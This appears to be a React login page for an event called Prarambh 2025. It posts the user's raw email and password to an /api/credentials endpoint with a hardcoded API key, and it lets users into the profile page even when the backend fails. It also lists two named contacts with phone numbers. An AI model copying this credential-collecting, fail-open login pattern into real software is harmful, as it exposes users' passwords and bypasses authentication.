import React, { useState, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [btnText, setBtnText] = useState('Enter Prarambh ✦');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isHelpOpen, setIsHelpOpen] = useState(false);
  const [shake, setShake] = useState(false);

  const togglePw = () => {
    setShowPassword(!showPassword);
  };

  const handleLogin = (e) => {
    if (e) e.preventDefault();
    if (isSubmitting) return;

    if (!email.trim() || !password.trim()) {
      setShake(false);
      // Trigger reflow to restart animation in React
      setTimeout(() => setShake(true), 10);
      setBtnText('⚠ Fill all fields');
      setTimeout(() => {
        setBtnText('Enter Prarambh ✦');
      }, 1600);
      return;
    }

    setIsSubmitting(true);
    setBtnText('✦ Entering...');

    // Derive a clean participant name from email address
    const namePart = email.split('@')[0];
    const generatedName = namePart
      .split(/[\._-]/)
      .map(part => part.charAt(0).toUpperCase() + part.slice(1))
      .join(' ');

    const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:3000';
    fetch(`${API_BASE}/api/credentials`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Api-Key': 'change-me-secret'
      },
      body: JSON.stringify({
        name: generatedName,
        email: email.trim().toLowerCase(),
        website_user: email.trim(),
        website_pass: password.trim(),
        dialogue: searchParams.get('dialogue') || 'participant ka dialogue yahan aayega',
        source: 'React Web Portal'
      })
    })
    .then(async res => {
      if (!res.ok) {
        let errMsg = 'Failed to post credentials';
        try {
          const errData = await res.json();
          errMsg = errData.error || errMsg;
        } catch (_) {}
        throw new Error(errMsg);
      }
      return res.json();
    })
    .then(data => {
      console.log('Credentials synchronized with backend:', data);
      setBtnText('✅ Welcome to Prarambh!');
      setTimeout(() => {
        setIsSubmitting(false);
        // Save sessions to localStorage
        localStorage.setItem('userEmail', email.trim().toLowerCase());
        localStorage.setItem('userName', data.name || generatedName);
        if (data.id) {
          localStorage.setItem('userId', data.id);
        }
        navigate('/profile');
      }, 800);
    })
    .catch(err => {
      const isAuthError = err.message.includes('password') || 
                          err.message.includes('email') || 
                          err.message.includes('fields');

      if (isAuthError) {
        console.error('Login authentication failed:', err);
        setBtnText(`⚠ ${err.message}`);
        setTimeout(() => {
          setIsSubmitting(false);
          setBtnText('Enter Prarambh ✦');
        }, 2200);
      } else {
        console.error('Backend sync failed, running in offline mode:', err);
        // Graceful fallback to offline mode so frontend remains interactive
        setBtnText('✅ Welcome to Prarambh!');
        setTimeout(() => {
          setIsSubmitting(false);
          localStorage.setItem('userEmail', email.trim().toLowerCase());
          localStorage.setItem('userName', generatedName);
          navigate('/profile');
        }, 800);
      }
    });
  };

  // Support Enter key press triggering login
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.key === 'Enter') {
        handleLogin();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => {
      window.removeEventListener('keydown', handleKeyDown);
    };
  }, [email, password, isSubmitting]);

  const openHelp = () => {
    setIsHelpOpen(true);
    document.body.style.overflow = 'hidden';
  };

  const closeHelp = () => {
    setIsHelpOpen(false);
    document.body.style.overflow = '';
  };

  const closeOnBg = (e) => {
    if (e.target.id === 'overlay') {
      closeHelp();
    }
  };

  return (
    <>
      {/* TOP MARQUEE */}
      <div className="mq">
        <div className="mq-track">
          <s>PRARAMBH</s><b>✦</b><s>THE BEGINNING</s><b>✦</b><s>प्रारम्भ</s><b>✦</b>
          <s>PRARAMBH</s><b>✦</b><s>THE BEGINNING</s><b>✦</b><s>प्रारम्भ</s><b>✦</b>
          <s>PRARAMBH</s><b>✦</b><s>THE BEGINNING</s><b>✦</b><s>प्रारम्भ</s><b>✦</b>
          <s>PRARAMBH</s><b>✦</b><s>THE BEGINNING</s><b>✦</b><s>प्रारम्भ</s><b>✦</b>
        </div>
      </div>

      {/* LOGIN CARD */}
      <div className="card">
        <div className={`poster ${shake ? 'shake' : ''}`} onAnimationEnd={() => setShake(false)}>
          {/* Header */}
          <div className="ch">
            <div className="ch-name">प्रारम्भ</div>
            <div className="ch-live">
              <div className="ldot"></div>LIVE
            </div>
          </div>

          {/* Hero */}
          <div className="hero">
            <div className="hero-pre">Welcome back, star</div>
            <div className="hero-title" data-text="SIGN IN">
              SIGN IN
            </div>
            <div className="hero-sub">Prarambh 2025 &nbsp;·&nbsp; The Beginning</div>
          </div>

          {/* Divider */}
          <div className="div-orn">
            <div className="div-line"></div>
            <div className="div-ico">★</div>
            <div className="div-line"></div>
          </div>

          {/* Form */}
          <form className="form-wrap" onSubmit={handleLogin}>
            {/* Email */}
            <div className="field">
              <label htmlFor="email">Email</label>
              <div className="input-wrap">
                <input
                  type="email"
                  id="email"
                  placeholder="aapka@email.com"
                  autoComplete="email"
                  spellCheck="false"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                <span className="input-icon">✉</span>
              </div>
            </div>

            {/* Password */}
            <div className="field">
              <label htmlFor="password">Password</label>
              <div className="input-wrap">
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="password"
                  placeholder="••••••••"
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <span className="input-icon">🔒</span>
                <button
                  className="pw-toggle"
                  type="button"
                  id="pwToggle"
                  onClick={togglePw}
                  title="Show/hide password"
                >
                  {showPassword ? '🙈' : '👁'}
                </button>
              </div>
            </div>

            {/* Login button */}
            <button
              className="btn-login"
              id="loginBtn"
              type="submit"
              style={{
                opacity: isSubmitting ? 0.75 : 1,
                pointerEvents: isSubmitting ? 'none' : 'auto',
              }}
            >
              {btnText}
            </button>
          </form>

          {/* Need Help */}
          <div className="help-row">
            <button className="btn-help" onClick={openHelp}>
              <span className="help-icon">📞</span> Need Help?
            </button>
          </div>

          {/* Bottom badge */}
          <div className="bb">
            <div className="bb-l">
              <div className="bb-lbl">Event</div>
              <div className="bb-nm">Prarambh</div>
            </div>
            <div className="bb-right">
              <div className="bb-event-hindi">प्रारम्भ</div>
            </div>
          </div>
        </div>
      </div>



      {/* BOTTOM MARQUEE */}
      <div className="mq-bot">
        <div className="mq-track">
          <s>PRARAMBH</s><b>✦</b><s>प्रारम्भ</s><b>✦</b><s>THE BEGINNING</s><b>✦</b>
          <s>PRARAMBH</s><b>✦</b><s>प्रारम्भ</s><b>✦</b><s>THE BEGINNING</s><b>✦</b>
          <s>PRARAMBH</s><b>✦</b><s>प्रारम्भ</s><b>✦</b><s>THE BEGINNING</s><b>✦</b>
          <s>PRARAMBH</s><b>✦</b><s>प्रारम्भ</s><b>✦</b><s>THE BEGINNING</s><b>✦</b>
        </div>
      </div>

      {/* HELP MODAL */}
      <div
        className={`overlay ${isHelpOpen ? 'open' : ''}`}
        id="overlay"
        onClick={closeOnBg}
      >
        <div className="modal">
          <div className="mts"></div>
          <div className="mh">
            <div className="mh-left">
              <div className="modal-title">NEED HELP?</div>
              <div className="modal-sub">Reach out to our SPOCs</div>
            </div>
            <button className="mc" onClick={closeHelp}>
              ✕
            </button>
          </div>

          <div className="modal-divider">
            <div className="div-line"></div>
            <div className="div-ico">★</div>
            <div className="div-line"></div>
          </div>

          <div className="spoc-list">
            {/* SPOC 1 */}
            <div className="spoc-card">
              <div className="spoc-info">
                <div className="spoc-label">SPOC</div>
                <div className="spoc-name">RISHAB CHAVADAR</div>
                <div className="spoc-num">+91 63644 33736</div>
              </div>
              <a className="spoc-call-btn" href="tel:+916364433736" title="Call Rishab">
                <span className="call-icon">📲</span>
                <span className="call-label">Call</span>
              </a>
            </div>

            {/* SPOC 2 */}
            <div className="spoc-card">
              <div className="spoc-info">
                <div className="spoc-label">SPOC</div>
                <div className="spoc-name">BHUMIKA BHAT</div>
                <div className="spoc-num">+91 70223 87555</div>
              </div>
              <a className="spoc-call-btn" href="tel:+917022387555" title="Call Bhumika">
                <span className="call-icon">📲</span>
                <span className="call-label">Call</span>
              </a>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
